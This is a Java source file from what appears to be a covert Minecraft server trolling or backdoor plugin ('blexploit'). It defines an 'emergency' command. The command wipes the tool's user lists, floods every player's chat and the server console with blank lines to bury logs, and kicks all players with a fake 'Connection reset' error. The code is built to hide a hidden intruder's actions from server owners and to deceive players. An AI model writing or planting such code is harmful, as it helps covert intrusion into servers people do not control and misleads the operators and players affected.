package de.blexploit.command.cmds;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.players.Getrollts;
import de.blexploit.players.Mittrollers;
import de.blexploit.players.create.MittrollerEntity;

public final class N extends Command {

	public N() {
		super("n", "Notfall - Bereinigit Konsolen und wirft alle Spieler einmalig raus");
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (mt.isAdmin()) {
			Mittrollers.clear();
			Getrollts.clear();
			Mittrollers.add(mt.getPlayername(), true);
			Mittrollers.get(mt.getPlayername()).setTrollMode(false);
			spamChat();
			kickAll();
			spamConsole();
		} else {
			mt.fehler(Fehler.NO_PERMISSIONS);
		}
	}

	private void kickAll() {
		for (Player allP : Bukkit.getOnlinePlayers()) {
			allP.kickPlayer(ChatColor.WHITE + "Internal exception: java.net.SocketException: Connection reset");
		}
	}

	private void spamChat() {
		for (Player allP : Bukkit.getOnlinePlayers()) {
			for (int i = 0; i < 130; i++) {
				allP.sendMessage("");
			}
		}
	}

	private void spamConsole() {
		String s = "";
		for (int i = 0; i < 200; i++) {
			s = s + "\n";
		}
		for (int i = 1; i != 100; i++) {
			System.out.print(s);
		}
	}

}
